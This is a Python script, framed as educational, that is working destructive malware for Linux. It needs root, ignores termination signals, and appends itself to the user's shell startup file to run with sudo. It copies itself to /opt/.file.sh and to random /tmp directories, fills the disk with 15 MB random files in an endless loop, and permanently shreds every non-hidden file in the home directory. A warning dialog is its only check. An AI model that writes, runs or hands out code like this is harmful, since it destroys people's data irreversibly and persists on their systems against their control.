import os
import random
import string
import shutil
import signal
import subprocess
import sys
import tempfile
from pathlib import Path

def signal_handler(signum, frame):
    """Handle signals by ignoring them."""
    print(f"Signal {signum} received. Ignoring.")

# Register signal handlers to block SIGINT and SIGTERM
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def check_sudo_permissions():
    """Check if the script is run with sudo permissions."""
    if os.geteuid() != 0:
        print("This script must be run with sudo permissions.")
        sys.exit(1)

def check_zenity_installation():
    """Check if zenity is installed."""
    try:
        subprocess.run(['zenity', '--version'], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Zenity is not installed. Please install zenity to run this script.")
        sys.exit(1)

def show_warning():
    """Show a warning message using zenity."""
    warning_message = (
        "WARNING: This software is for educational purposes only. "
        "Running this script will create random files, replicate itself, and corrupt non-system files.\n\n"
        "Proceeding can cause data loss and system instability. Do you want to continue?"
    )
    zenity_command = [
        "zenity", "--warning", "--text", warning_message, "--title", "Warning",
        "--ok-label", "Run Script", "--cancel-label", "Exit"
    ]
    try:
        result = subprocess.run(zenity_command, capture_output=True)
        if result.returncode != 0:
            print("User chose to exit.")
            sys.exit(0)
    except FileNotFoundError:
        print("Zenity is not installed. Please install zenity to run this script.")
        sys.exit(1)

def generate_random_filename():
    """Generates a random filename."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '.bin'

def create_random_file(filename, size_mb):
    """Creates a file with the specified name and fills it with random data of specified size in MB."""
    size_bytes = size_mb * 1024 * 1024  # Convert MB to bytes
    with open(filename, 'wb') as f:
        f.write(os.urandom(size_bytes))

def replicate_script():
    """Replicates the script to random locations and /opt/.file.sh."""
    script_path = os.path.realpath(__file__)
    # Make a copy of the script to /opt/.file.sh using sudo
    try:
        subprocess.run(['sudo', 'cp', script_path, '/opt/.file.sh'], check=True)
        print("Copied script to /opt/.file.sh")
    except subprocess.CalledProcessError:
        print("Failed to copy to /opt/.file.sh")

    # Make copies to random locations
    for _ in range(5):  # Adjust the range for more or fewer copies
        random_dir = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        random_path = os.path.join('/tmp', random_dir)
        os.makedirs(random_path, exist_ok=True)
        destination_path = os.path.join(random_path, os.path.basename(script_path))
        shutil.copy(script_path, destination_path)
        print(f"Copied script to {destination_path}")

def add_to_startup():
    """Adds the script to the shell's startup file."""
    script_path = os.path.realpath(__file__)
    home_dir = str(Path.home())
    startup_file = None
    
    # Determine which startup file to use
    if os.path.isfile(os.path.join(home_dir, '.bashrc')):
        startup_file = os.path.join(home_dir, '.bashrc')
    elif os.path.isfile(os.path.join(home_dir, '.zshrc')):
        startup_file = os.path.join(home_dir, '.zshrc')
    elif os.path.isfile(os.path.join(home_dir, '.profile')):
        startup_file = os.path.join(home_dir, '.profile')
    
    if startup_file:
        with open(startup_file, 'a') as f:
            f.write(f'\n# Run script on startup\nsudo python3 {script_path} &\n')
        print(f"Added to startup file: {startup_file}")
    else:
        print("No startup file found to add the script.")

def shred_non_system_files():
    """Shreds non-system files in the user's home directory."""
    home_dir = str(Path.home())
    for root, dirs, files in os.walk(home_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                # Only shred files that are not system files and do not have .term extension
                if not any(part.startswith('.') for part in Path(file_path).parts) and not file.endswith('.term'):
                    subprocess.run(['shred', '-n', '3', '-u', file_path], check=True)
                    print(f"Shredded file: {file_path}")
            except subprocess.CalledProcessError:
                print(f"Failed to shred file: {file_path}")

def start_progress_bar(pipe_path):
    """Starts the zenity progress bar."""
    zenity_command = [
        "zenity", "--progress", "--pulsate", "--auto-close", "--no-cancel", 
        "--title", "Running Script", "--text", "The script is running. Please wait..."
    ]
    with open(pipe_path, 'w') as pipe:
        try:
            subprocess.run(zenity_command, stdin=pipe)
        except FileNotFoundError:
            print("Zenity is not installed. Please install zenity to run this script.")
            sys.exit(1)

def main():
    check_sudo_permissions()
    check_zenity_installation()
    show_warning()

    # Create a named pipe
    pipe_path = os.path.join(tempfile.gettempdir(), "script_pipe")
    if not os.path.exists(pipe_path):
        os.mkfifo(pipe_path)

    # Start the progress bar in a separate process
    progress_bar_process = subprocess.Popen(['python3', '-c', 
        'import sys; from script import start_progress_bar; start_progress_bar(sys.argv[1])', pipe_path])

    size_mb = 15  # Size of each file in MB
    add_to_startup()
    while True:
        random_number = random.randint(1, 1000000)  # Generate a random number
        print(f"Generated random number: {random_number}")
        
        filename = generate_random_filename()
        print(f"Creating file: {filename}")
        
        create_random_file(filename, size_mb)
        print(f"Created {size_mb}MB file: {filename}")
        
        # Replicate the script
        replicate_script()
        
        # Shred non-system files
        shred_non_system_files()

if __name__ == "__main__":
    main()
